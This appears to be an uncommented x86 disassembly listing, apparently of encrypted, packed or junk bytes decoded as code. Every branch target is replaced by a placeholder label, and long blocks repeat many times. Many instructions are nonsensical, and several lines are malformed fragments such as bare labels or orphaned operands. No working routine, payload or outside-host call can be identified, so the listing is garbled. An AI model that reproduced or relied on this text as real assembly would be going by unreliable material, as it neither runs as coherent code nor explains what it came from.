rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
lahf
mov edi 0xf6af3ef3
xchg ebx eax
jpo r-xdata
xchg edx eax
cwde
outsd
jpo r-xdata
push eax
add [ esp + eax * 4 - 0x7b65656e ] 0xebebeb84
jmp r-xdata
jmp r-xdata
clc
mov edi 0x74bbfe77
push edx
je r-xdata
imul ebp [ ecx + 0x7b ] 0x92bb487b
pushfd
jl r-xdata
jpo r-xdata
jpo r-xdata
test [ esp + eax * 4 - 0x7b7ac56e ] eax
test bl ch
jmp r-xdata
je r-xdata
sub eax 0xf8a3f043
add [ esp + esi * 2 + 0x7b6969fe ] 0x7b
dec eax
mov ebx 0x7b7c9c92
dec eax
lea ebp [ 0xffffffff92372c84 ]
sub al 0x4a
jpo r-xdata
jmp r-xdata
pop ebp
pop esi
jpo r-xdata
mov dl 0xb8
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
dec eax
mov ebx 0xb2202524
mov eax 0xebebebeb
sbb eax 0x229336f2
sub [ 0xfffffffff09136f2 ] ebx
cmpsd [ esi ] [ edi ]
xchg edx eax
arpl [ ebp + 0x7b ] si
jpo r-xdata
lahf
add dh [ ecx + 0x7b ]
jpo r-xdata
mov bl 0x1d
xchg edi eax
and dl [ edx + 0x7b7b524e ]
jmp r-xdata
xchg ebx eax
and ch [ ecx ]
sbb eax 0xf09136f2
jmp r-xdata
jmp r-xdata
jmp r-xdata
push 0xffffff85
xchg edx eax
cmpsd [ esi ] [ edi ]
test [ ebx + ebp * 8 - 0xde2f7ef ] al
cdq
and edx [ ecx ]
pop ecx
xchg edx eax
out 0x62 al
jpo r-xdata
or al 0x9f
test bl ch
mov ah 0x71
jpo r-xdata
jpo r-xdata
mov dl 0xb8
jmp r-xdata
xchg edi eax
dec ebx
adc [ ecx ] ebx
xchg edx eax
lds ebx [ ebx - 0x14147b7c ]
sbb eax 0xff748dfe
cmc
jne r-xdata
jmp r-xdata
dec ebx
imul edi [ ebx ] 0x35
jmp r-xdata
jpo r-xdata
pop eax
jpo r-xdata
jpo r-xdata
jmp r-xdata
je r-xdata
jle r-xdata
cmp esi [ 0x747efe74 ]
test [ edx + edx * 4 - 0x7b7b7ac6 ] al
jmp r-xdata
jmp r-xdata
jpo r-xdata
clc
pop ds
pop edi
pop edi
jpo r-xdata
jg r-xdata
int3
jpo r-xdata
jpo r-xdata
mov ch 0x55
jpo r-xdata
jo r-xdata
and al 0x25
mov eax 0xa792ebeb
xchg edx eax
cmp al [ ebp - 0x14147b7c ]
jmp r-xdata
[ 0xfffffffff0b906f2 ] 0x85
xchg edx eax
retn
jmp r-xdata
iretd
aas
pop edi
pop edi
sub esi [ esp + ecx * 8 + 0x7c ]
sub ebx [ 0x1d793cf0 ]
je r-xdata
js r-xdata
js r-xdata
jmp r-xdata
clc
mov ebx 0xb4922b73
jno r-xdata
jmp r-xdata
jpo r-xdata
pop edi
pop ebx
xchg edx eax
ja r-xdata
jpo r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub ebp [ edx + esi * 8 ]
jpo r-xdata
clc
jpo r-xdata
xchg [ esp + eax * 4 - 0x6d94d37c ] al
lds ebx [ edx - 0x14147b7c ]
jmp r-xdata
cmp esi [ ecx + ebx * 8 - 0xe ]
xchg edx esi
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
xor edx 0x2e
xchg edx esi
std
push eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
r-xdata
test ah cl
mov edi 0x937b7b7b
0x7b61
test [ ebx ] ch
sub dl dh
into
stosd [ edi ]
js r-xdata
sbb eax 0x1d793cf0
jmp r-xdata
jmp r-xdata
xchg edx eax
xchg edi eax
xchg ebx eax
xchg edi eax
jge r-xdata
mov edi 0x74bbfe77
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
add edx [ edx + 0x7b7b7e11 ]
jmp r-xdata
dec eax
mov ebx 0x63d6923b
jpo r-xdata
jmp r-xdata
xchg ecx eax
push esp
jpo r-xdata
jg r-xdata
xchg edx eax
pop esp
jpo r-xdata
jmp r-xdata
jae r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx ] eax
xchg edx eax
adc [ esi + 0x7b ] edi
jpo r-xdata
jmp r-xdata
mov bh al
mov edx 0x723c9279
jpo r-xdata
jpo r-xdata
pop esp
cmp eax 0xeb84848e
jpo r-xdata
imul [ esi ]
pushad
jpe r-xdata
xchg edx eax
jle r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ebx 0x5cf3ff74
pop esp
jmp r-xdata
adc [ 0xfffffffff21db3f0 ] edx
cmp esi [ ebx - 0x6e ]
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 + 0x3ef66b11 ] al
stosd [ edi ]
sub eax 0x7b61d292
jmp r-xdata
jmp r-xdata
mov es [ esp + eax * 4 - 0x40071415 ]
inc ebx
xchg edx eax
xchg esi eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
mov esp [ ss : edx ]
adc [ edi ] ecx
xchg edx eax
int3
adc eax 0xf21db3f0
je r-xdata
jpo r-xdata
push ebx
sub_479c0a
inc eax
xchg edx eax
sub al 0x4a
jpo r-xdata
sub [ esi + ebp * 2 + 0x7b7b7bd7 ] al
xchg edx eax
jne r-xdata
mov dl 0xb8
jmp r-xdata
jpo r-xdata
cmpsd [ esi ] [ edi ]
xchg edx eax
arpl [ ebp + 0x7b ] si
jpo r-xdata
dec eax
mov ebx 0xb2202524
mov eax 0xebebebeb
sbb eax 0x229336f2
sub [ 0xfffffffff09136f2 ] ebx
xchg edx eax
sbb esp [ ecx - 0x1147b7c ]
jmp r-xdata
add dh [ ecx + 0x7b ]
jpo r-xdata
mov bl 0x1d
xchg edi eax
and dl [ edx + 0x7b7b524e ]
jmp r-xdata
xchg ebx eax
and ch [ ecx ]
sbb eax 0xf09136f2
mov dl 0x92
int 0x9a
test [ ebx + ebp * 8 - 0x516c4310 ] al
and ah [ edx ]
xchg edx eax
push esp
push eax
jpo r-xdata
mov [ esi + edi * 8 - 0x10 ] dh
push ebp
jpo r-xdata
jmp r-xdata
push 0xffffff85
pop ebx
jpo r-xdata
jmp r-xdata
test bl ch
int1
outsd
inc ecx
xchg ebx eax
lds ebx [ eax - 0x9d47b7c ]
test [ ebx ] ch
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 - 0x60f36dd5 ] al
lodsb [ esi ]
test [ edx + 0x7b7a2892 ] al
jpo r-xdata
xchg ebx eax
scasb [ edi ]
mov dl 0xb8
jmp r-xdata
je r-xdata
jle r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
xchg edx eax
cmpsd [ esi ] [ edi ]
test [ ebx + ebp * 8 - 0xde2f7ef ] al
cdq
and edx [ ecx ]
pop ecx
xchg edx eax
out 0x62 al
jpo r-xdata
or al 0x9f
test [ edx + edx * 4 - 0x7b7b7ac6 ] al
jmp r-xdata
jmp r-xdata
js r-xdata
js r-xdata
mov ch 0x55
jpo r-xdata
jo r-xdata
and al 0x25
mov eax 0xa792ebeb
mov ah 0x71
jpo r-xdata
jpo r-xdata
xchg edx eax
cmp al [ ebp - 0x14147b7c ]
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub ebp [ edx + esi * 8 ]
jmp r-xdata
clc
mov ebx 0xb4922b73
jno r-xdata
xchg edi eax
dec ebx
adc [ ecx ] ebx
xchg edx eax
lds ebx [ ebx - 0x14147b7c ]
sbb eax 0xff748dfe
cmc
jne r-xdata
jmp r-xdata
dec ebx
imul edi [ ebx ] 0x35
jmp r-xdata
jmp r-xdata
push eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
clc
jpo r-xdata
pop eax
jpo r-xdata
jpo r-xdata
jmp r-xdata
cmp esi [ 0x747efe74 ]
jmp r-xdata
jmp r-xdata
xchg edx eax
xchg edi eax
xchg ebx eax
xchg edi eax
jge r-xdata
mov edi 0x74bbfe77
jpo r-xdata
r-xdata
test ah cl
mov edi 0x937b7b7b
0x7b61
jpo r-xdata
clc
pop ds
pop edi
pop edi
jpo r-xdata
jg r-xdata
int3
add edx [ edx + 0x7b7b7e11 ]
jmp r-xdata
dec eax
mov ebx 0x63d6923b
jpo r-xdata
jmp r-xdata
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
[ 0xfffffffff0b906f2 ] 0x85
xchg edx eax
retn
jmp r-xdata
iretd
aas
pop edi
pop edi
sub esi [ esp + ecx * 8 + 0x7c ]
sub ebx [ 0x1d793cf0 ]
je r-xdata
xchg edx eax
pop esp
jpo r-xdata
jmp r-xdata
jae r-xdata
xchg ecx eax
push esp
jpo r-xdata
jg r-xdata
jpo r-xdata
pop edi
pop ebx
xchg edx eax
ja r-xdata
jpo r-xdata
adc [ ebx ] eax
xchg edx eax
adc [ esi + 0x7b ] edi
jpo r-xdata
jmp r-xdata
mov bh al
mov edx 0x723c9279
jpo r-xdata
jpo r-xdata
pop esp
cmp eax 0xeb84848e
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
xchg [ esp + eax * 4 - 0x6d94d37c ] al
lds ebx [ edx - 0x14147b7c ]
jmp r-xdata
cmp esi [ ecx + ebx * 8 - 0xe ]
xchg edx esi
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
xor edx 0x2e
xchg edx esi
std
jmp r-xdata
jmp r-xdata
mov ebx 0x5cf3ff74
pop esp
jmp r-xdata
jpo r-xdata
imul [ esi ]
pushad
jpe r-xdata
xchg edx eax
jle r-xdata
jmp r-xdata
test [ ebx ] ch
sub dl dh
into
stosd [ edi ]
js r-xdata
sbb eax 0x1d793cf0
cmp esi [ ebx - 0x6e ]
jmp r-xdata
adc [ 0xfffffffff21db3f0 ] edx
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 + 0x3ef66b11 ] al
stosd [ edi ]
sub eax 0x7b61d292
jmp r-xdata
mov es [ esp + eax * 4 - 0x40071415 ]
inc ebx
xchg edx eax
xchg esi eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
mov esp [ ss : edx ]
adc [ edi ] ecx
xchg edx eax
int3
adc eax 0xf21db3f0
je r-xdata
jpo r-xdata
push ebx
sub_479c25
jmp r-xdata
sub [ esi + ebp * 2 + 0x7b7b7bd7 ] al
xchg edx eax
jne r-xdata
xchg edx eax
sub al 0x4a
jpo r-xdata
jpo r-xdata
mov dl 0xb8
jmp r-xdata
xchg edx eax
sbb esp [ ecx - 0x1147b7c ]
jmp r-xdata
cmpsd [ esi ] [ edi ]
xchg edx eax
arpl [ ebp + 0x7b ] si
jpo r-xdata
dec eax
mov ebx 0xb2202524
mov eax 0xebebebeb
sbb eax 0x229336f2
sub [ 0xfffffffff09136f2 ] ebx
mov dl 0x92
int 0x9a
test [ ebx + ebp * 8 - 0x516c4310 ] al
and ah [ edx ]
xchg edx eax
push esp
push eax
jpo r-xdata
mov [ esi + edi * 8 - 0x10 ] dh
push ebp
jpo r-xdata
add dh [ ecx + 0x7b ]
jpo r-xdata
mov bl 0x1d
xchg edi eax
and dl [ edx + 0x7b7b524e ]
jmp r-xdata
xchg ebx eax
and ch [ ecx ]
sbb eax 0xf09136f2
pop ebx
jpo r-xdata
jmp r-xdata
jmp r-xdata
push 0xffffff85
int1
outsd
inc ecx
xchg ebx eax
lds ebx [ eax - 0x9d47b7c ]
test [ ebx ] ch
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 - 0x60f36dd5 ] al
lodsb [ esi ]
test [ edx + 0x7b7a2892 ] al
jpo r-xdata
xchg ebx eax
scasb [ edi ]
test bl ch
je r-xdata
jle r-xdata
jmp r-xdata
jmp r-xdata
mov dl 0xb8
jmp r-xdata
jpo r-xdata
jpo r-xdata
xchg edx eax
cmpsd [ esi ] [ edi ]
test [ ebx + ebp * 8 - 0xde2f7ef ] al
cdq
and edx [ ecx ]
pop ecx
xchg edx eax
out 0x62 al
jpo r-xdata
or al 0x9f
jpo r-xdata
js r-xdata
js r-xdata
mov ch 0x55
jpo r-xdata
jo r-xdata
and al 0x25
mov eax 0xa792ebeb
mov ah 0x71
jpo r-xdata
jpo r-xdata
test [ edx + edx * 4 - 0x7b7b7ac6 ] al
jmp r-xdata
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub ebp [ edx + esi * 8 ]
jmp r-xdata
clc
mov ebx 0xb4922b73
jno r-xdata
xchg edi eax
dec ebx
adc [ ecx ] ebx
xchg edx eax
lds ebx [ ebx - 0x14147b7c ]
sbb eax 0xff748dfe
cmc
jne r-xdata
jmp r-xdata
dec ebx
imul edi [ ebx ] 0x35
jmp r-xdata
xchg edx eax
cmp al [ ebp - 0x14147b7c ]
jmp r-xdata
push eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
clc
jpo r-xdata
pop eax
jpo r-xdata
jpo r-xdata
jmp r-xdata
cmp esi [ 0x747efe74 ]
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
xchg edi eax
xchg ebx eax
xchg edi eax
jge r-xdata
mov edi 0x74bbfe77
jpo r-xdata
r-xdata
test ah cl
mov edi 0x937b7b7b
0x7b61
jpo r-xdata
clc
pop ds
pop edi
pop edi
jpo r-xdata
jg r-xdata
int3
add edx [ edx + 0x7b7b7e11 ]
jmp r-xdata
dec eax
mov ebx 0x63d6923b
jpo r-xdata
jmp r-xdata
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
[ 0xfffffffff0b906f2 ] 0x85
xchg edx eax
retn
jmp r-xdata
iretd
aas
pop edi
pop edi
sub esi [ esp + ecx * 8 + 0x7c ]
sub ebx [ 0x1d793cf0 ]
je r-xdata
xchg edx eax
pop esp
jpo r-xdata
jmp r-xdata
jae r-xdata
xchg ecx eax
push esp
jpo r-xdata
jg r-xdata
jpo r-xdata
pop edi
pop ebx
xchg edx eax
ja r-xdata
jpo r-xdata
adc [ ebx ] eax
xchg edx eax
adc [ esi + 0x7b ] edi
jpo r-xdata
jmp r-xdata
mov bh al
mov edx 0x723c9279
jpo r-xdata
jpo r-xdata
pop esp
cmp eax 0xeb84848e
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
xchg [ esp + eax * 4 - 0x6d94d37c ] al
lds ebx [ edx - 0x14147b7c ]
jmp r-xdata
cmp esi [ ecx + ebx * 8 - 0xe ]
xchg edx esi
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
xor edx 0x2e
xchg edx esi
std
jmp r-xdata
jmp r-xdata
mov ebx 0x5cf3ff74
pop esp
jmp r-xdata
jpo r-xdata
imul [ esi ]
pushad
jpe r-xdata
xchg edx eax
jle r-xdata
jmp r-xdata
test [ ebx ] ch
sub dl dh
into
stosd [ edi ]
js r-xdata
sbb eax 0x1d793cf0
cmp esi [ ebx - 0x6e ]
jmp r-xdata
adc [ 0xfffffffff21db3f0 ] edx
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 + 0x3ef66b11 ] al
stosd [ edi ]
sub eax 0x7b61d292
jmp r-xdata
mov es [ esp + eax * 4 - 0x40071415 ]
inc ebx
xchg edx eax
xchg esi eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
mov esp [ ss : edx ]
adc [ edi ] ecx
xchg edx eax
int3
adc eax 0xf21db3f0
je r-xdata
jpo r-xdata
push ebx
sub_479c56
jmp r-xdata
jpo r-xdata
fstp [ ebx + 0x7b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
test [ ebp + 0x7b ] ebp
jpo r-xdata
lahf
jpo r-xdata
and ah [ edx ]
jmp r-xdata
mov edi 0xf6af3ef3
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
lahf
jmp r-xdata
pop ebx
jpo r-xdata
jmp r-xdata
xchg edx eax
push esp
push eax
jpo r-xdata
lahf
int1
outsd
inc ecx
xchg ebx eax
lds ebx [ eax - 0x9d47b7c ]
test [ ebx ] ch
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 - 0x60f36dd5 ] al
xchg ebx eax
scasb [ edi ]
je r-xdata
jle r-xdata
jmp r-xdata
jmp r-xdata
lodsb [ esi ]
test [ edx + 0x7b7a2892 ] al
jpo r-xdata
mov dl 0x92
int 0x9a
test [ ebx + ebp * 8 - 0x516c4310 ] al
jpo r-xdata
jpo r-xdata
xchg edx eax
cmpsd [ esi ] [ edi ]
test [ ebx + ebp * 8 - 0xde2f7ef ] al
cdq
and edx [ ecx ]
pop ecx
xchg edx eax
out 0x62 al
jpo r-xdata
or al 0x9f
js r-xdata
js r-xdata
mov ch 0x55
jpo r-xdata
jo r-xdata
and al 0x25
mov eax 0xa792ebeb
mov ah 0x71
jpo r-xdata
jpo r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub ebp [ edx + esi * 8 ]
jmp r-xdata
clc
mov ebx 0xb4922b73
jno r-xdata
xchg edi eax
dec ebx
adc [ ecx ] ebx
xchg edx eax
lds ebx [ ebx - 0x14147b7c ]
sbb eax 0xff748dfe
cmc
jne r-xdata
jmp r-xdata
dec ebx
imul edi [ ebx ] 0x35
jmp r-xdata
jmp r-xdata
push eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
clc
jpo r-xdata
pop eax
jpo r-xdata
jpo r-xdata
jmp r-xdata
cmp esi [ 0x747efe74 ]
xchg edx eax
cmp al [ ebp - 0x14147b7c ]
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
xchg edi eax
xchg ebx eax
xchg edi eax
jge r-xdata
mov edi 0x74bbfe77
jpo r-xdata
r-xdata
test ah cl
mov edi 0x937b7b7b
0x7b61
jpo r-xdata
clc
pop ds
pop edi
pop edi
jpo r-xdata
jg r-xdata
int3
jmp r-xdata
add edx [ edx + 0x7b7b7e11 ]
jmp r-xdata
dec eax
mov ebx 0x63d6923b
jpo r-xdata
jmp r-xdata
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
[ 0xfffffffff0b906f2 ] 0x85
xchg edx eax
retn
jmp r-xdata
iretd
aas
pop edi
pop edi
sub esi [ esp + ecx * 8 + 0x7c ]
sub ebx [ 0x1d793cf0 ]
je r-xdata
mov dl 0xb8
jmp r-xdata
xchg edx eax
pop esp
jpo r-xdata
jmp r-xdata
jae r-xdata
xchg ecx eax
push esp
jpo r-xdata
jg r-xdata
jpo r-xdata
pop edi
pop ebx
xchg edx eax
ja r-xdata
jpo r-xdata
jpo r-xdata
adc [ ebx ] eax
xchg edx eax
adc [ esi + 0x7b ] edi
jpo r-xdata
jmp r-xdata
mov bh al
mov edx 0x723c9279
jpo r-xdata
jpo r-xdata
pop esp
cmp eax 0xeb84848e
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
xchg [ esp + eax * 4 - 0x6d94d37c ] al
lds ebx [ edx - 0x14147b7c ]
jmp r-xdata
cmp esi [ ecx + ebx * 8 - 0xe ]
xchg edx esi
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
xor edx 0x2e
xchg edx esi
std
test [ edx + edx * 4 - 0x7b7b7ac6 ] al
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ebx 0x5cf3ff74
pop esp
jmp r-xdata
jpo r-xdata
imul [ esi ]
pushad
jpe r-xdata
xchg edx eax
jle r-xdata
jmp r-xdata
test [ ebx ] ch
sub dl dh
into
stosd [ edi ]
js r-xdata
sbb eax 0x1d793cf0
test bl ch
cmp esi [ ebx - 0x6e ]
jmp r-xdata
adc [ 0xfffffffff21db3f0 ] edx
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 + 0x3ef66b11 ] al
stosd [ edi ]
sub eax 0x7b61d292
jmp r-xdata
mov es [ esp + eax * 4 - 0x40071415 ]
inc ebx
xchg edx eax
xchg esi eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
mov esp [ ss : edx ]
adc [ edi ] ecx
xchg edx eax
int3
adc eax 0xf21db3f0
je r-xdata
jpo r-xdata
push ebx
sub_479c6f
push cs
jae r-xdata
jmp r-xdata
sub eax 0xf8a3f043
add [ esp + esi * 2 + 0x7b6969fe ] 0x7b
dec eax
mov ebx 0x7b7c9c92
jpo r-xdata
dec eax
lea ebp [ 0xffffffff92372c84 ]
sub al 0x4a
jpo r-xdata
xchg edx eax
cwde
outsd
jpo r-xdata
push eax
mov dl [ edx + 0x7b7b618e ]
and bh dh
mov ebx 0x84994992
test bl ch
mov dl 0xb8
jmp r-xdata
add [ esp + eax * 4 - 0x7b65656e ] 0xebebeb84
jmp r-xdata
jmp r-xdata
cmpsd [ esi ] [ edi ]
xchg edx eax
arpl [ ebp + 0x7b ] si
jpo r-xdata
dec eax
mov ebx 0xb2202524
mov eax 0xebebebeb
sbb eax 0x229336f2
sub [ 0xfffffffff09136f2 ] ebx
clc
mov edi 0x74bbfe77
push edx
je r-xdata
add dh [ ecx + 0x7b ]
jpo r-xdata
mov bl 0x1d
xchg edi eax
and dl [ edx + 0x7b7b524e ]
jmp r-xdata
xchg ebx eax
and ch [ ecx ]
sbb eax 0xf09136f2
imul ebp [ ecx + 0x7b ] 0x92bb487b
pushfd
jl r-xdata
jmp r-xdata
push 0xffffff85
jpo r-xdata
jpo r-xdata
test bl ch
test [ esp + eax * 4 - 0x7b7ac56e ] eax
test bl ch
jmp r-xdata
je r-xdata
mov dl 0xb8
jmp r-xdata
jmp r-xdata
pop ebp
pop esi
jpo r-xdata
jpo r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
test [ edx + edx * 4 - 0x7b7b7ac6 ] al
jmp r-xdata
jmp r-xdata
lahf
xchg edx eax
cmp al [ ebp - 0x14147b7c ]
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
cmpsd [ esi ] [ edi ]
test [ ebx + ebp * 8 - 0xde2f7ef ] al
cdq
and edx [ ecx ]
pop ecx
xchg edx eax
out 0x62 al
jpo r-xdata
or al 0x9f
mov ah 0x71
jpo r-xdata
jpo r-xdata
xchg edi eax
dec ebx
adc [ ecx ] ebx
xchg edx eax
lds ebx [ ebx - 0x14147b7c ]
sbb eax 0xff748dfe
cmc
jne r-xdata
jmp r-xdata
dec ebx
imul edi [ ebx ] 0x35
jmp r-xdata
pop eax
jpo r-xdata
jpo r-xdata
jmp r-xdata
je r-xdata
jle r-xdata
cmp esi [ 0x747efe74 ]
jpo r-xdata
clc
pop ds
pop edi
pop edi
jpo r-xdata
jg r-xdata
int3
jpo r-xdata
jpo r-xdata
mov ch 0x55
jpo r-xdata
jo r-xdata
and al 0x25
mov eax 0xa792ebeb
[ 0xfffffffff0b906f2 ] 0x85
xchg edx eax
retn
jmp r-xdata
iretd
aas
pop edi
pop edi
sub esi [ esp + ecx * 8 + 0x7c ]
sub ebx [ 0x1d793cf0 ]
je r-xdata
js r-xdata
js r-xdata
jmp r-xdata
clc
mov ebx 0xb4922b73
jno r-xdata
jpo r-xdata
pop edi
pop ebx
xchg edx eax
ja r-xdata
jpo r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub ebp [ edx + esi * 8 ]
jpo r-xdata
clc
jpo r-xdata
xchg [ esp + eax * 4 - 0x6d94d37c ] al
lds ebx [ edx - 0x14147b7c ]
jmp r-xdata
cmp esi [ ecx + ebx * 8 - 0xe ]
xchg edx esi
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
xor edx 0x2e
xchg edx esi
std
push eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
r-xdata
test ah cl
mov edi 0x937b7b7b
0x7b61
test [ ebx ] ch
sub dl dh
into
stosd [ edi ]
js r-xdata
sbb eax 0x1d793cf0
jmp r-xdata
jmp r-xdata
xchg edx eax
xchg edi eax
xchg ebx eax
xchg edi eax
jge r-xdata
mov edi 0x74bbfe77
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
add edx [ edx + 0x7b7b7e11 ]
jmp r-xdata
dec eax
mov ebx 0x63d6923b
jpo r-xdata
jmp r-xdata
xchg ecx eax
push esp
jpo r-xdata
jg r-xdata
xchg edx eax
pop esp
jpo r-xdata
jmp r-xdata
jae r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx ] eax
xchg edx eax
adc [ esi + 0x7b ] edi
jpo r-xdata
jmp r-xdata
mov bh al
mov edx 0x723c9279
jpo r-xdata
jpo r-xdata
pop esp
cmp eax 0xeb84848e
jpo r-xdata
imul [ esi ]
pushad
jpe r-xdata
xchg edx eax
jle r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ebx 0x5cf3ff74
pop esp
jmp r-xdata
adc [ 0xfffffffff21db3f0 ] edx
cmp esi [ ebx - 0x6e ]
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 + 0x3ef66b11 ] al
stosd [ edi ]
sub eax 0x7b61d292
jmp r-xdata
jmp r-xdata
mov es [ esp + eax * 4 - 0x40071415 ]
inc ebx
xchg edx eax
xchg esi eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
mov esp [ ss : edx ]
adc [ edi ] ecx
xchg edx eax
int3
adc eax 0xf21db3f0
je r-xdata
jpo r-xdata
push ebx
sub_479cbe
test bl ch
fstp [ ebx + 0x7b ]
jpo r-xdata
jmp r-xdata
test [ ebp + 0x7b ] ebp
jpo r-xdata
jpo r-xdata
and ah [ edx ]
jmp r-xdata
lahf
jmp r-xdata
pop ebx
jpo r-xdata
jmp r-xdata
xchg edx eax
push esp
push eax
jpo r-xdata
mov edi 0xf6af3ef3
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
lahf
lahf
int1
outsd
inc ecx
xchg ebx eax
lds ebx [ eax - 0x9d47b7c ]
test [ ebx ] ch
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 - 0x60f36dd5 ] al
xchg ebx eax
scasb [ edi ]
je r-xdata
jle r-xdata
jmp r-xdata
jmp r-xdata
lodsb [ esi ]
test [ edx + 0x7b7a2892 ] al
jpo r-xdata
mov dl 0x92
int 0x9a
test [ ebx + ebp * 8 - 0x516c4310 ] al
jpo r-xdata
jpo r-xdata
xchg edx eax
cmpsd [ esi ] [ edi ]
test [ ebx + ebp * 8 - 0xde2f7ef ] al
cdq
and edx [ ecx ]
pop ecx
xchg edx eax
out 0x62 al
jpo r-xdata
or al 0x9f
js r-xdata
js r-xdata
mov ch 0x55
jpo r-xdata
jo r-xdata
and al 0x25
mov eax 0xa792ebeb
mov ah 0x71
jpo r-xdata
jpo r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub ebp [ edx + esi * 8 ]
jmp r-xdata
clc
mov ebx 0xb4922b73
jno r-xdata
xchg edi eax
dec ebx
adc [ ecx ] ebx
xchg edx eax
lds ebx [ ebx - 0x14147b7c ]
sbb eax 0xff748dfe
cmc
jne r-xdata
jmp r-xdata
dec ebx
imul edi [ ebx ] 0x35
jmp r-xdata
jmp r-xdata
push eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
clc
jpo r-xdata
pop eax
jpo r-xdata
jpo r-xdata
jmp r-xdata
cmp esi [ 0x747efe74 ]
xchg edx eax
cmp al [ ebp - 0x14147b7c ]
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
xchg edi eax
xchg ebx eax
xchg edi eax
jge r-xdata
mov edi 0x74bbfe77
jpo r-xdata
r-xdata
test ah cl
mov edi 0x937b7b7b
0x7b61
jpo r-xdata
clc
pop ds
pop edi
pop edi
jpo r-xdata
jg r-xdata
int3
jmp r-xdata
add edx [ edx + 0x7b7b7e11 ]
jmp r-xdata
dec eax
mov ebx 0x63d6923b
jpo r-xdata
jmp r-xdata
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
[ 0xfffffffff0b906f2 ] 0x85
xchg edx eax
retn
jmp r-xdata
iretd
aas
pop edi
pop edi
sub esi [ esp + ecx * 8 + 0x7c ]
sub ebx [ 0x1d793cf0 ]
je r-xdata
mov dl 0xb8
jmp r-xdata
xchg edx eax
pop esp
jpo r-xdata
jmp r-xdata
jae r-xdata
xchg ecx eax
push esp
jpo r-xdata
jg r-xdata
jpo r-xdata
pop edi
pop ebx
xchg edx eax
ja r-xdata
jpo r-xdata
jpo r-xdata
adc [ ebx ] eax
xchg edx eax
adc [ esi + 0x7b ] edi
jpo r-xdata
jmp r-xdata
mov bh al
mov edx 0x723c9279
jpo r-xdata
jpo r-xdata
pop esp
cmp eax 0xeb84848e
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
xchg [ esp + eax * 4 - 0x6d94d37c ] al
lds ebx [ edx - 0x14147b7c ]
jmp r-xdata
cmp esi [ ecx + ebx * 8 - 0xe ]
xchg edx esi
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
xor edx 0x2e
xchg edx esi
std
test [ edx + edx * 4 - 0x7b7b7ac6 ] al
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ebx 0x5cf3ff74
pop esp
